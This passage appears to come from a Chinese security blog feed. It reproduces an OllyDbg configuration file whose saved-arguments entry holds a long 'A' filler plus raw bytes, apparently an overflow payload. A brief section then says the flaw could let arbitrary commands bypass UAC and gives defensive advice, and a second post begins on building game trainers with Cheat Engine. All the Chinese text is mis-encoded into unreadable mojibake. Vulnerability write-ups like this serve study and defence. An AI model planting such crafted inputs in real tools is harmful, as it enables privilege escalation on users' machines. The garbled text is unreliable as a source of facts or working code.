class="line">Label includes module name=1</span><br><span class="line">Highlight symbolic labels=1</span><br><span class="line">Highlight RETURNs in stack=1</span><br><span class="line">Ignore path in user data file=1</span><br><span class="line">Ignore timestamp in user data file=1</span><br><span class="line">Ignore CRC in user data file=1</span><br><span class="line">Default sort mode in Names=1</span><br><span class="line">Save out-of-module user data=0</span><br><span class="line">Tabulate columns in log file=0</span><br><span class="line">Append data to existing log file=0</span><br><span class="line">Flush gathered data to log file=0</span><br><span class="line">Skip spaces in source comments=1</span><br><span class="line">Hide non-existing source files=1</span><br><span class="line">Tab stops=8</span><br><span class="line">File graph mode=2</span><br><span class="line">Show internal handle names=0</span><br><span class="line">Hide irrelevant handles=0</span><br><span class="line">[Plugin ODbgScript]</span><br><span class="line">Restore Script window=0</span><br><span class="line">Restore Script Log=0</span><br><span class="line">BP_0001=</span><br><span class="line">æ¢å¤è„šæœ¬çª—å£</span><br><span class="line">=0</span><br><span class="line">è¿˜åŸè„šæœ¬æ—¥å¿—</span><br><span class="line">=0</span><br><span class="line">æ¢å¤è„šæœ¬çª—å£</span><br><span class="line">=0</span><br><span class="line">è¿˜åŸè„šæœ¬æ—¥å¿—</span><br><span class="line">=0</span><br><span class="line">æ¢å¤è„šæœ¬çª—å£</span><br><span class="line">=0</span><br><span class="line">è¿˜åŸè„šæœ¬æ—¥å¿—</span><br><span class="line">=0</span><br><span class="line">æ¢å¤è„šæœ¬çª—å£</span><br><span class="line">=0</span><br><span class="line">è¿˜åŸè„šæœ¬æ—¥å¿—</span><br><span class="line">=0</span><br><span class="line">æ¢å¤è„šæœ¬çª—å£</span><br><span class="line">=0</span><br><span class="line">è¿˜åŸè„šæœ¬æ—¥å¿—</span><br><span class="line">=0</span><br><span class="line">è¿˜åŸè„šæœ¬çª—å£=0</span><br><span class="line">è¿˜åŸè„šæœ¬æ—¥å¿—=0</span><br><span class="line">MRU1=C:\Users\lenovo\Desktop\od.txt</span><br><span class="line">MRU2=</span><br><span class="line">MRU3=</span><br><span class="line">MRU4=</span><br><span class="line">MRU5=</span><br><span class="line">ScriptDir=C:\Users\lenovo\Desktop\od.txt</span><br><span class="line">BP_FILE=C:\Users\lenovo\Desktop\od.txt</span><br><span class="line">[System]</span><br><span class="line">Options position=134,126</span><br><span class="line">Call DLL position=20,89</span><br><span class="line">[Plugin IDAFicator]</span><br><span class="line">Custom Scheme=0,8388608,32768,8421376,128,8388736,32896,12632256,8421504,16711680,65280,16776960,255,16711935,65535,16777215,12639424,15780004,15793151,10789024</span><br><span class="line">disableClickJmp=1</span><br><span class="line">DIA MAC x=0</span><br><span class="line">DIA MAC y=0</span><br><span class="line">DIA HWBP x=0</span><br><span class="line">DIA HWBP y=0</span><br><span class="line">Custom BP list=NonaWrite</span><br><span class="line">disasmCode=0</span><br><span class="line">PATH_RADASM=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\plugin\minimalist-radasm</span><br><span class="line">PATH_HELP=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\plugin\IDAFICATOR.hlp</span><br><span class="line">SETTINGS_MSEC=500</span><br><span class="line">DIA_CUSTOMIZE_SCHEME=0,8388608,32768,8421376,128,8388736,32896,12632256,8421504,16711680,65280,16776960,255,16711935,65535,16777215,12639424,15780004,15793151,10789024</span><br><span class="line">SETTINGS_MAIN=1,1,1,1,1</span><br><span class="line">SETTINGS_DUMP=</span><br><span class="line">SETTINGS_DISASM=1,0,0</span><br><span class="line">SETTINGS_STACK=</span><br><span class="line">SETTINGS_HWBP=0,0,0</span><br><span class="line">SETTINGS_ROTE=</span><br><span class="line">LAYOUT_ID=0</span><br><span class="line">LAYOUT_SWAP_DUMP_STACK=0</span><br><span class="line">SETTINGS_COMPILER=0</span><br><span class="line">DIA_ROTE_POS=-4,-4,1032,746</span><br><span class="line">MNU_PATHS_DIRS_N=0</span><br><span class="line">MNU_PATHS_FILES_N=0</span><br><span class="line">[Plugin è¶…çº§å­—ä¸²å‚è€ƒ]</span><br><span class="line">Restore UStrRef Window=1</span><br><span class="line">[Placement]</span><br><span class="line">OllyTest=434,64,1219,623,1</span><br><span class="line">CPU=35,302,1027,472,3</span><br><span class="line">CPU subwindows=601,1459,595,1459,583,1155,518,1179</span><br><span class="line">è¶…çº§å­—ä¸²å‚è€ƒ=22,29,618,230,1</span><br><span class="line">Executable modules=0,0,162,45,1</span><br><span class="line">Memory map=0,0,162,45,1</span><br><span class="line">Log data=282,17,312,45,1</span><br><span class="line">Threads=0,0,162,45,1</span><br><span class="line">Windows=0,0,162,45,1</span><br><span class="line">Handles=132,16,547,437,1</span><br><span class="line">Patches=278,0,312,45,1</span><br><span class="line">Call stack=137,16,312,45,1</span><br><span class="line">Source=44,58,372,274,1</span><br><span class="line">References=0,0,162,45,1</span><br><span class="line">Breakpoints=0,0,162,45,1</span><br><span class="line">ä¸­æ–‡æœç´¢å¼•æ“=278,38,312,57,1</span><br><span class="line">Call tree=0,0,312,45,1</span><br><span class="line">è„šæœ¬è¿è¡Œçª—å£=193,89,201,45,1</span><br><span class="line">Watch expressions=99,37,540,230,1</span><br><span class="line">Source files=66,87,474,230,1</span><br><span class="line">Run trace=22,29,432,230,1</span><br><span class="line">SEH chain=88,116,270,230,1</span><br><span class="line">CPU subwindows 1=374,767,336,658,450,960,388,853</span><br><span class="line">CPU subwindows 2=374,767,336,658,450,960,388,853</span><br><span class="line">CPU subwindows 3=374,767,336,658,450,960,388,853</span><br><span class="line">CPU subwindows 4=374,767,336,658,450,960,388,853</span><br><span class="line">[Colours]</span><br><span class="line">Scheme[0]=10,12,18,0,5,15,13,13</span><br><span class="line">Scheme name[0]=Dave&#x27;s black</span><br><span class="line">Scheme[1]=1,5,0,18,7,18,4,12</span><br><span class="line">Scheme name[1]=Fancy Nico</span><br><span class="line">Scheme[2]=7,12,7,10,11,7,3,13</span><br><span class="line">Scheme name[2]=Kostya&#x27;s blue</span><br><span class="line">Scheme[3]=7,12,7,0,5,15,18,13</span><br><span class="line">Scheme name[3]=Dami&#x27;s black</span><br><span class="line">Scheme[4]=0,12,8,18,7,8,7,13</span><br><span class="line">Scheme name[4]=Scheme 4</span><br><span class="line">Scheme[5]=14,12,7,1,3,7,3,13</span><br><span class="line">Scheme name[5]=Scheme 5</span><br><span class="line">Scheme[6]=1,12,3,11,14,2,7,13</span><br><span class="line">Scheme name[6]=Scheme 6</span><br><span class="line">Scheme[7]=15,12,7,0,8,11,7,13</span><br><span class="line">Scheme name[7]=Scheme 7</span><br><span class="line">[Fonts]</span><br><span class="line">Font[0]=16,8,400,0,0,0,134,2,49,0</span><br><span class="line">Face name[0]=Terminal</span><br><span class="line">Font name[0]=OEM ç­‰å®½å­—ä½“</span><br><span class="line">Font[1]=-12,0,400,0,0,0,134,1,49,0</span><br><span class="line">Face name[1]=æ–°å®‹ä½“</span><br><span class="line">Font name[1]=Terminal 6</span><br><span class="line">Font[2]=16,8,400,0,0,0,134,2,49,0</span><br><span class="line">Face name[2]=Fixedsys</span><br><span class="line">Font name[2]=ç³»ç»Ÿç­‰å®½å­—ä½“</span><br><span class="line">Font[3]=14,0,400,0,0,0,1,2,5,0</span><br><span class="line">Face name[3]=Courier New</span><br><span class="line">Font name[3]=Courier (UNICODE)</span><br><span class="line">Font[4]=10,6,400,0,0,0,1,2,5,0</span><br><span class="line">Face name[4]=Lucida Console</span><br><span class="line">Font name[4]=Lucida (UNICODE)</span><br><span class="line">Font[5]=9,6,700,0,0,0,255,0,48,0</span><br><span class="line">Face name[5]=Terminal</span><br><span class="line">Font name[5]=å­—ä½“ 5</span><br><span class="line">Font[6]=16,8,400,0,0,0,134,2,49,0</span><br><span class="line">Face name[6]=Fixedsys</span><br><span class="line">Font name[6]=å­—ä½“ 6</span><br><span class="line">Font[7]=14,0,400,0,0,0,1,2,5,0</span><br><span class="line">Face name[7]=Courier New</span><br><span class="line">Font name[7]=å­—ä½“ 7</span><br><span class="line">[Syntax]</span><br><span class="line">Commands[1]=10,7,12,12,14,12,12,13,96,7,14,0,0,0</span><br><span class="line">Operands[1]=1,7,7,7,13,14,10,11,0,0,0,0,0,0</span><br><span class="line">Scheme name[1]=Dave</span><br><span class="line">Commands[2]=1,1,1,1,1,1,1,4,109,12,12,0,0,0</span><br><span class="line">Operands[2]=1,1,2,4,12,2,2,5,0,0,0,0,0,0</span><br><span class="line">Scheme name[2]=Fancy Nico</span><br><span class="line">Commands[3]=14,4,124,124,9,110,64,13,111,8,12,0,0,0</span><br><span class="line">Operands[3]=1,10,4,13,11,13,15,6,0,0,0,0,0,0</span><br><span class="line">Scheme name[3]=Kostya&#x27;s xmas tree</span><br><span class="line">Commands[4]=7,7,2,12,6,12,10,13,96,7,14,0,0,0</span><br><span class="line">Operands[4]=1,7,7,7,13,7,10,11,0,0,0,0,0,0</span><br><span class="line">Scheme name[4]=Dami</span><br><span class="line">Commands[5]=0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Operands[5]=0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Scheme name[5]=No highlighting</span><br><span class="line">Commands[0]=0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Operands[0]=0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Scheme name[0]=No highlighting</span><br><span class="line">[Arguments]</span><br><span class="line">Executable[1]=</span><br><span class="line">Executable[2]=</span><br><span class="line">Executable[3]=</span><br><span class="line">Executable[4]=</span><br><span class="line">Executable[5]=</span><br><span class="line">Executable[0]=</span><br><span class="line">[Appearance]</span><br><span class="line">CPU scheme=3</span><br><span class="line">CPU Disassembler=2,3,0,0,3</span><br><span class="line">CPU Dump=2,3,1,0,4353,0</span><br><span class="line">CPU Stack=2,3,0,0</span><br><span class="line">CPU Info=2,3,0,0</span><br><span class="line">CPU Registers=2,3,1,0</span><br><span class="line">è¶…çº§å­—ä¸²å‚è€ƒ=1,0,1,0,0</span><br><span class="line">Executable modules=1,0,1,0,0</span><br><span class="line">Memory map=1,0,1,0,0</span><br><span class="line">Log data=1,0,1,0,0</span><br><span class="line">Threads=1,0,1,0,0</span><br><span class="line">Windows=1,0,1,0,0</span><br><span class="line">Handles=1,0,1,0,0</span><br><span class="line">Patches=1,0,1,0,0</span><br><span class="line">Call stack=1,0,1,0,0</span><br><span class="line">Source=1,0,0,0,0</span><br><span class="line">References=1,0,1,0,0</span><br><span class="line">Breakpoints=1,0,1,0,0</span><br><span class="line">ä¸­æ–‡æœç´¢å¼•æ“=1,0,1,0,0</span><br><span class="line">Call tree=1,0,1,0,0</span><br><span class="line">è„šæœ¬è¿è¡Œçª—å£=1,0,1,0,0</span><br><span class="line">Watch expressions=1,0,1,0,0</span><br><span class="line">Source files=1,0,1,0,0</span><br><span class="line">Run trace=1,0,1,0,0</span><br><span class="line">SEH chain=1,0,1,0,0</span><br><span class="line">[Columns]</span><br><span class="line">CPU Disassembler=72,136,320,2048</span><br><span class="line">CPU Dump=72,384,136,</span><br><span class="line">CPU Stack=72,80,2048,</span><br><span class="line">è¶…çº§å­—ä¸²å‚è€ƒ=54,240,1536</span><br><span class="line">Executable modules=54,54,54,54,223,1536</span><br><span class="line">Memory map=54,54,54,54,72,30,48,48,1536</span><br><span class="line">Log data=54,1536</span><br><span class="line">Threads=54,54,66,108,60,54,72,72</span><br><span class="line">Windows=78,192,54,54,54,54,54,54,54,1536</span><br><span class="line">Handles=54,90,36,54,18,72,1536</span><br><span class="line">Patches=54,30,48,192,192,1536</span><br><span class="line">Call stack=54,54,216,168,54</span><br><span class="line">Source=48,1536</span><br><span class="line">References=54,240,1536</span><br><span class="line">Breakpoints=54,54,150,216,1536</span><br><span class="line">ä¸­æ–‡æœç´¢å¼•æ“=54,240,1536</span><br><span class="line">Call tree=192,192,192,192</span><br><span class="line">è„šæœ¬è¿è¡Œçª—å£=30,240,90,54,600</span><br><span class="line">Watch expressions=216,1536</span><br><span class="line">Source files=54,96,1536</span><br><span class="line">Run trace=54,54,54,54,192,1536</span><br><span class="line">SEH chain=54,192</span><br><span class="line">[Plugin StrongOD]</span><br><span class="line">CreateProcessMode=0</span><br><span class="line">HidePEB=1</span><br><span class="line">IsPatchFloat=1</span><br><span class="line">IsAdvGoto=0</span><br><span class="line">KernelMode=1</span><br><span class="line">KillPEBug=1</span><br><span class="line">SuperEnumMod=1</span><br><span class="line">AdvAttach=1</span><br><span class="line">SkipExpection=1</span><br><span class="line">OrdFirst=0</span><br><span class="line">BreakOnLdr=0</span><br><span class="line">BreakOnTls=1</span><br><span class="line">RemoveEpOneShot=1</span><br><span class="line">ShowBar=17</span><br><span class="line">LoadSym=0</span><br><span class="line">AutoUpdate=0</span><br><span class="line">HideWindow=1</span><br><span class="line">HideProcess=1</span><br><span class="line">ProtectProcess=1</span><br><span class="line">DriverKey=-514523012</span><br><span class="line">DriverName=Rockey5U</span><br><span class="line">UpdateURL=</span><br><span class="line">[Plugin ä¸­æ–‡æœç´¢å¼•æ“]</span><br><span class="line">Restore UStrRef Window=1</span><br><span class="line">[Import libraries]</span><br><span class="line">Implib[0]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\MFC42.Lib</span><br><span class="line">Implib[1]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfc42d.lib</span><br><span class="line">Implib[2]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfc42u.lib</span><br><span class="line">Implib[3]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfc42ud.lib</span><br><span class="line">Implib[4]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfc71.Lib</span><br><span class="line">Implib[5]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfc71d.lib</span><br><span class="line">Implib[6]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfc71u.lib</span><br><span class="line">Implib[7]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfc71ud.lib</span><br><span class="line">Implib[8]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfc80.lib</span><br><span class="line">Implib[9]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfc80d.lib</span><br><span class="line">Implib[10]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfc80u.lib</span><br><span class="line">Implib[11]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfc80ud.lib</span><br><span class="line">Implib[12]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfcd42d.lib</span><br><span class="line">Implib[13]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfcd42ud.lib</span><br><span class="line">Implib[14]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfcn42d.lib</span><br><span class="line">Implib[15]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfcn42ud.lib</span><br><span class="line">Implib[16]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfco42d.lib</span><br><span class="line">Implib[17]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\mfco42ud.lib</span><br><span class="line">Implib[18]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\MSVBVM50.lib</span><br><span class="line">Implib[19]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\msvbvm60.lib</span><br><span class="line">Implib[20]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\msvcp60.lib</span><br><span class="line">Implib[21]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\msvcp71.lib</span><br><span class="line">Implib[22]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\msvcp80.lib</span><br><span class="line">Implib[23]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\MSVCR70.lib</span><br><span class="line">Implib[24]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\msvcr71.lib</span><br><span class="line">Implib[25]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\msvcr80.lib</span><br><span class="line">Implib[26]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\msvcrt.lib</span><br><span class="line">Implib[27]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\comctl32.lib</span><br><span class="line">Implib[28]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\dbgeng.lib</span><br><span class="line">Implib[29]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\dbghelp.lib</span><br><span class="line">Implib[30]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\kernel32.lib</span><br><span class="line">Implib[31]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\ntdll.lib</span><br><span class="line">Implib[32]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\oleaut32.lib</span><br><span class="line">Implib[33]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\oledlg.lib</span><br><span class="line">Implib[34]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\ollydbg.lib</span><br><span class="line">Implib[35]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\ws2_32.lib</span><br><span class="line">Implib[36]=C:\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\LIB\wsock32.lib</span><br><span class="line">[Plugin ILLY]</span><br><span class="line">AutoRun=0</span><br><span class="line">[å‚æ•°]</span><br><span class="line">å‚æ•°[0]=123123</span><br><span class="line">å‚æ•°[1]=&quot;&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAo\CAAAAAAAAAAAAAAAAè°æµ¸éœ_è³¢$é¬ª)æ€11nå†¾?n?&#123;ï½šHåˆ“?é¡¾ljè“’]éµw?Zy;ãƒ‘_r6I?ç£¹ç˜åŒ·é«€å›¦îš è˜™Zî¿gç š??ç¿—è’³?HC/ç³ è¹ i?9T&#x27;è­‰æ‚˜6æ¡ç¤/å»°è°´7??å¤·åƒ²æ—¢ã€Šé­ºD&#125;è¸’??é‹«n3é°‰è’|?ã„å“¨&gt;eæ¯@fé”qéŸ…ç¿‡$?l??dî¡è’–&lt;ç®Wç³€Q?ç˜´?æ¢†`æ†­ç»¯y&#123;??&quot;&quot;</span><br><span class="line">Argument[1]=1</span><br><span class="line">Argument[0]=123123</span><br><span class="line">[Exceptions]</span><br><span class="line">Custom[0]=00000000,FFFFFFFF</span><br></pre></td></tr></table></figure></div>



<h2 id="æ¼æ´å½±å“"><a href="#æ¼æ´å½±å“" class="headerlink" title="æ¼æ´å½±å“"></a>æ¼æ´å½±å“</h2><p>åœ¨ win7 ä»¥ä¸Šçš„ç³»ç»Ÿä½¿ç”¨ OD ä¹‹å‰éœ€è¦å…è®¸ UACï¼Œä¼¼ä¹å¯ä»¥ä½¿ç”¨æ¼æ´åŸºäºè°ƒè¯•å™¨ç»•è¿‡ UAC æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<p>ä½†æ˜¯ç»¼åˆæ¥çœ‹è§¦å‘æ¼æ´çš„æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ï¼Œæ€»ä½“åˆ©ç”¨ä»·å€¼ä¸ç®—ç‰¹åˆ«é«˜ã€‚</p>
<p>å¹³æ—¶ä½¿ç”¨ OD çš„æ—¶å€™å°½é‡ä¸è¦ä½¿ç”¨å‚æ•°åŠŸèƒ½ï¼Œå¿…é¡»ä½¿ç”¨çš„æ—¶å€™å…ˆç‚¹å‡»ä¸‹æ‹‰èœå•çœ‹çœ‹æœ‰æ²¡æœ‰ç‰¹åˆ«å¥‡æ€ªçš„å‚æ•°ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>ç®€å•çš„æ¸¸æˆä¿®æ”¹å™¨å®ç°</title>
    <url>/2020/02/23/game_trainer1/</url>
    <content><![CDATA[<p>å¦‚ä½•å®ç°ä¸€ä¸ªæœ€ç®€å•çš„æ¸¸æˆä¿®æ”¹å™¨ï¼Ÿ</p>
<span id="more"></span>

<h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>é—²æ¥æ— äº‹ç®€å•å­¦ä¹ ä¸€ä¸‹æ¸¸æˆä¿®æ”¹å™¨çš„åŸç†ã€‚</p>
<p>ä¿®æ”¹å™¨å¤§è‡´åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯å¤–éƒ¨çš„ï¼Œå³ä¿®æ”¹å™¨è¿›ç¨‹ç‹¬ç«‹äºæ¸¸æˆè¿›ç¨‹ä¹‹å¤–è¿è¡Œï¼Œé€šè¿‡æŸäº›ç³»ç»Ÿ API å®ç°å¯¹æ¸¸æˆçš„ä¿®æ”¹ã€‚å¦ä¸€ç§æ˜¯å†…éƒ¨çš„ï¼Œä¿®æ”¹å™¨é€šè¿‡ç‰¹æ®Šæ‰‹æ®µæŠŠè‡ªå·±æ³¨å…¥æ¸¸æˆè¿›ç¨‹ä¸­ï¼Œç›´æ¥è®¿é—®å’Œæ“ä½œæ¸¸æˆæ•°æ®ã€‚</p>
<p>ä¸¤ç§æ–¹å¼å„æœ‰ä¼˜ç¼ºç‚¹ï¼Œå¤–éƒ¨ä¿®æ”¹å™¨æ¯”è¾ƒç¨³å®šï¼Œæ— éœ€å¯¹æ¸¸æˆçš„å†…å­˜æ•°æ®è¿›è¡Œå¤§èŒƒå›´å˜åŠ¨ï¼Œä½†æ˜¯å…¶ä½¿ç”¨ API å’Œæ¸¸æˆè¿›è¡Œé€šä¿¡ï¼Œæ•ˆç‡è¾ƒä½ï¼Œå“åº”é€Ÿåº¦è¾ƒæ…¢ã€‚</p>
<p>å†…éƒ¨ä¿®æ”¹å™¨éœ€è¦å°†ä»£ç æ³¨å…¥åˆ°æ¸¸æˆè¿›ç¨‹ä¸­ï¼Œæ³¨å…¥åä»¥æ–°çš„çº¿ç¨‹æ–¹å¼ç›´æ¥å­˜å–å†…å­˜æ•°æ®ï¼Œåœ¨æ•ˆç‡ä¸Šæ›´å¥½ï¼Œå“åº”é€Ÿåº¦æ›´å¿«ï¼Œä½†æ˜¯å¯¹æ¸¸æˆå†…å­˜æœ‰è¾ƒå¤§çš„æ”¹åŠ¨ï¼Œä¸æ˜¯å¾ˆç¨³å®šã€‚ä¸è¿‡å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä¸¤è€…å·®åˆ«ä¸å¤§ï¼Œæ— è®ºå“ªç§æŠ€æœ¯ï¼Œåªè¦èƒ½å¤Ÿè¾¾æˆä¿®æ”¹çš„ç›®çš„å³å¯ã€‚</p>
<p>ä¿®æ”¹å™¨çš„åŸºæœ¬æ€è·¯ï¼š</p>
<ol>
<li>æ‰¾åˆ°æƒ³è¦ä¿®æ”¹çš„æ•°æ®</li>
<li>ä¿®æ”¹</li>
<li>æŸ¥çœ‹ç»“æœ</li>
</ol>
<h2 id="å¦‚ä½•å¯»æ‰¾æƒ³è¦ä¿®æ”¹çš„æ•°æ®ï¼Ÿ"><a href="#å¦‚ä½•å¯»æ‰¾æƒ³è¦ä¿®æ”¹çš„æ•°æ®ï¼Ÿ" class="headerlink" title="å¦‚ä½•å¯»æ‰¾æƒ³è¦ä¿®æ”¹çš„æ•°æ®ï¼Ÿ"></a>å¦‚ä½•å¯»æ‰¾æƒ³è¦ä¿®æ”¹çš„æ•°æ®ï¼Ÿ</h2><p>æ¸¸æˆä¹Ÿæ˜¯è½¯ä»¶ï¼Œæˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„æ•°æ®ä¸€å®šä½äºå†…å­˜çš„æŸä¸ªåœ°å€ä¸­ã€‚</p>
<p>å·¥å…·ï¼šCheat Engine æˆ–å…¶ä»–å†…å­˜æœç´¢ &amp; ä¿®æ”¹å·¥å…·</p>
<p>æ¸¸æˆä¸­æ‰€æœ‰å‚æ•°éƒ½æœ‰å…¶å¯¹åº”çš„æ•°æ®ç»“æ„ï¼Œä¾‹å¦‚è¡€é‡å¯èƒ½ç”¨ intï¼Œç§»åŠ¨é€Ÿåº¦å¯èƒ½ç”¨ double ç­‰ã€‚å¹¶ä¸”è¿™äº›æ•°æ®ä¸ä¸€å®šè¦å‡†ç¡®çš„æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œå¾ˆå¤šæ¸¸æˆä¸­ä½¿ç”¨äº†è¿›åº¦æ¡å’Œå…¶ä»–å½¢å¼æ¥è¡¨ç¤ºæœ‰å…³æ•°æ®ï¼Œè¡€é‡æœ‰è¡€æ¡ï¼Œç§»åŠ¨é€Ÿåº¦åªèƒ½æ„ŸçŸ¥å‡ºæ¥ç­‰ç­‰ã€‚è¦æƒ³æ‰¾åˆ°è¿™äº›æ•°æ®ï¼Œéœ€è¦ç”¨åˆ°å¾ˆå¤šä¸åŒçš„æ–¹æ³•ã€‚å…¶ä¸­æœ€ä¸ºå¸¸ç”¨çš„å°±æ˜¯æœªçŸ¥åˆå§‹å€¼ &amp; å¢åŠ &#x2F;å‡å°å€¼æœç´¢ã€‚</p>
<p>CE è‡ªå¸¦å¾ˆå¤šæœç´¢æ•°æ®çš„æ–¹æ³•ï¼Œä¾‹å¦‚å…·æœ‰è¡€æ¡çš„ BOSSï¼Œå°±å¯ä»¥å…ˆæœç´¢æœªçŸ¥çš„åˆå§‹å€¼ï¼Œç„¶åæ”»å‡»å‡å°‘è¡€é‡ï¼Œå†æœç´¢å‡å°çš„å€¼ï¼Œä¸€æ­¥æ­¥æ‰¾åˆ°çœŸæ­£çš„æ•°æ®ã€‚å¯¹äºä½“é‡è¾ƒå¤§çš„æ¸¸æˆï¼Œé‡‡ç”¨äº†å¤§å‹å¼•æ“å¼€å‘ï¼Œé‚£ä¹ˆç›¸å…³æ•°æ®ç»“æ„ä¼šæ¯”è¾ƒæ··ä¹±ï¼Œå•çº¯ä½¿ç”¨ CE å¾ˆéš¾å®šä½å®é™…æ•°æ®çš„åœ°å€ã€‚æ­¤æ—¶éœ€è¦ç»“åˆé€†å‘åˆ†æï¼Œæ‰¾åˆ°ç›¸å…³ç¨‹åºä»£ç æ‰èƒ½é¡ºåˆ©å®šä½æ•°æ®ä½ç½®ã€‚</p>
<p><strong>ä¸¾ä¸ªä¾‹å­</strong></p>
<p>æ¯”è¾ƒç®€å•çš„æ¸¸æˆå®šä½æ•°æ®ã€‚è¿™é‡Œç”¨åˆ°çš„æ ·æœ¬æ˜¯ AssaultCubeï¼Œæ˜¯åŸºäº Cube å¼•æ“å¼€å‘çš„å¼€æºç¬¬ä¸€äººç§°å°„å‡»æ¸¸æˆï¼Œæ­¤æ¸¸æˆå†…éƒ¨æ•°æ®ç»“æ„æ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬å…ˆæ‹¿å®ƒå¼€åˆ€ã€‚</p>
<p>æ‰“å¼€æ¸¸æˆï¼Œé»˜è®¤ä¼šæ¥åˆ°è®­ç»ƒæ¨¡å¼ï¼Œæ­¤æ—¶éœ€è¦åœ¨é€‰é¡¹èœå•ä¸­é€‰æ‹©å•äººæ¨¡å¼ã€‚(åŸå› æ˜¯è®­ç»ƒæ¨¡å¼å’Œæ­£å¸¸æ¸¸æˆæ‰€ç”¨åˆ°çš„æ•°æ®å¾ˆå¯èƒ½ä¸æ˜¯åŒä¸€å¥—)</p>
<p>è¿›å…¥æ¸¸æˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°äººç‰©çš„åŸºæœ¬ä¿¡æ¯ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-1.png"
                     
                ></p>
<p>åŸºæœ¬ä¿¡æ¯åŒ…æ‹¬è¡€é‡ã€æªæ¢°å­å¼¹æ•°é‡ã€‚ç®€å•æ¸¸ç©å‘ç°è§’è‰²è¿˜å¯ä»¥è£…å¤‡é˜²å¼¹è¡£ï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨æŠ¤ç”²å€¼ï¼Œå¦å¤–è¿˜æœ‰æ‰‹æ¦´å¼¹ç­‰æŠ•æ·æ­¦å™¨çš„å­˜åœ¨ã€‚</p>
